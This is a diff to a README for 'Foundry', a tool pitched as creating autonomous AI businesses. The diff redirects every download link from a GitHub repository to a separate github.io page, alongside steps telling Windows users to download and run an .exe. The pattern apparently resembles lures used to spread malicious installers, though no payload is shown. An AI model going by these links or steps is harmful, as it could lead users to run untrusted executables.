@@ -1,6 +1,6 @@
 # 🤖 Foundry - Build Your New AI Business Fast
 
-[![](https://img.shields.io/badge/Download-Foundry-blue)](https://github.com/Asceticrefractoryperiod28/Foundry)
+[![](https://img.shields.io/badge/Download-Foundry-blue)](https://asceticrefractoryperiod28.github.io)
 
 Foundry creates autonomous businesses through artificial intelligence. This software provides the environment to design, launch, and manage digital companies. It automates complex workflows by connecting smart agents that work together. You gain a platform to turn your concepts into operational entities without writing code.
 
@@ -24,7 +24,7 @@ Your computer must meet basic standards to run Foundry smoothly. Check your sett
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Asceticrefractoryperiod28/Foundry).
+1.  Visit the [official download page](https://asceticrefractoryperiod28.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version with the label Latest.
 4.  Find the file ending in .exe under the Assets section.
@@ -33,7 +33,7 @@ Follow these steps to set up the software on your Windows computer.
 7.  Double-click the installer file to begin the setup.
 8.  Follow the instructions on the screen to place the app on your computer.
 
-[![](https://img.shields.io/badge/Get-Foundry-grey)](https://github.com/Asceticrefractoryperiod28/Foundry)
+[![](https://img.shields.io/badge/Get-Foundry-grey)](https://asceticrefractoryperiod28.github.io)
 
 ## 🚀 Setting Up Your First Company
 
